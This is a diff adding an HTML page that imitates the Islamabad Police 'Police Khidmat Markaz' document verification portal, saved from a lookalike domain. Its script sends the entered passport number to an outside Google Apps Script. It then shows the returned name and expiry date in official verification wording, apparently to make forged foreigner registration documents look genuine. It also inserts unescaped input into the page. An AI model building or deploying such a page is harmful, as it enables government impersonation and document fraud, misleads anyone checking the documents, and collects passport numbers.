@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<!-- saved from url=(0107)https://pkm.islamabadpolice.gov.pk.e-visa.pk/QR/publish/foreigner/c2VOWjBnM3BNSnZXaVExK2pUUVFBQT0/index.php -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Police Khidmat Markaz - Document Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="header-content">
+                <img src="https://pkm.islamabadpolice.gov.pk/assets/images/logo.png" alt="Police Logo" class="logo">
+               
+            </div>
+        </header>
+
+        <div class="content-wrapper">
+            <div class="content-box">
+                <h2 class="title">Document Verification</h2>
+                
+                <div class="verification-form">
+                    <div class="form-group">
+                        <label for="passport_number">Passport Number (required)</label>
+                        <input type="text" id="passport_number" name="passport_number" class="form-control" placeholder="Enter Pasport Number" required="">
+                    </div>
+                    
+                    <button type="button" onclick="verifyPassport()" class="submit-btn">SUBMIT</button>
+                </div>
+
+                <!-- Loading -->
+                <div id="loadingSection" style="display:none; text-align:center; padding:60px 20px;">
+                    <div class="loader"></div>
+                    <p style="margin-top:20px; color:#2c3e6e; font-size:16px;">Verifying document, please wait...</p>
+                </div>
+
+                <!-- Result -->
+                <div id="resultSection" style="display:none;">
+                    <div class="verification-result">
+                        <p class="result-text" id="resultText"></p>
+                    </div>
+                    <div class="back-link">
+                        <a href="#" onclick="goBack()">&#8592; Verify Another Document</a>
+                    </div>
+                </div>
+
+                <!-- Error -->
+                <div id="errorSection" style="display:none;">
+                    <div class="error-message" id="errorText"></div>
+                    <div class="back-link">
+                        <a href="#" onclick="goBack()">&#8592; Try Again</a>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <footer class="footer">
+            <p>© Copyright 2025 PITB</p>
+        </footer>
+    </div>
+
+    <style>
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #2c3e6e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz_n97blK2HgZedxm2zA8au0F9ydt7Uy3twtXix0zCtzz0t6i4w4Cnza8o0UahA-GnV/exec";
+
+        function formatDate(raw) {
+            var d = new Date(raw);
+            if (isNaN(d)) return raw; // agar already formatted ho toh as-is return
+            var day = String(d.getUTCDate()).padStart(2, '0');
+            var month = String(d.getUTCMonth() + 1).padStart(2, '0');
+            var year = d.getUTCFullYear();
+            return day + '/' + month + '/' + year;
+        }
+
+        var formSection = document.querySelector('.verification-form');
+
+        function verifyPassport() {
+            var passport = document.getElementById('passport_number').value.trim();
+            if (!passport) { alert('Please enter passport number'); return; }
+
+            formSection.style.display = 'none';
+            document.getElementById('loadingSection').style.display = 'block';
+            document.getElementById('resultSection').style.display = 'none';
+            document.getElementById('errorSection').style.display = 'none';
+
+            fetch(SCRIPT_URL + '?passport=' + encodeURIComponent(passport))
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    document.getElementById('loadingSection').style.display = 'none';
+                    if (data.found) {
+                        document.getElementById('resultText').innerHTML =
+                            'This Foreigner Registration document will expire on ' +
+                            '"<strong>' + formatDate(data.expiry) + '</strong>" and previously issued to ' +
+                            '"<strong>' + data.name + '</strong>" by Islamabad Police, Pakistan. ' +
+                            'This is electronic verification of the document cannot be challenged in ' +
+                            'The Court of Law. For detailed verification of the certificate please ' +
+                            'contact relevant district\'s Police Khidmat Markaz Incharge.';
+                        document.getElementById('resultSection').style.display = 'block';
+                    } else {
+                        document.getElementById('errorText').innerHTML =
+                            'No record found for passport number: <strong>' + passport + '</strong>';
+                        document.getElementById('errorSection').style.display = 'block';
+                    }
+                })
+                .catch(function() {
+                    document.getElementById('loadingSection').style.display = 'none';
+                    document.getElementById('errorText').innerHTML = 'Connection error. Please try again later.';
+                    document.getElementById('errorSection').style.display = 'block';
+                });
+        }
+
+        function goBack() {
+            document.getElementById('passport_number').value = '';
+            formSection.style.display = 'block';
+            document.getElementById('resultSection').style.display = 'none';
+            document.getElementById('errorSection').style.display = 'none';
+        }
+
+        document.getElementById('passport_number').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') verifyPassport();
+        });
+    </script>
+
+</body></html>
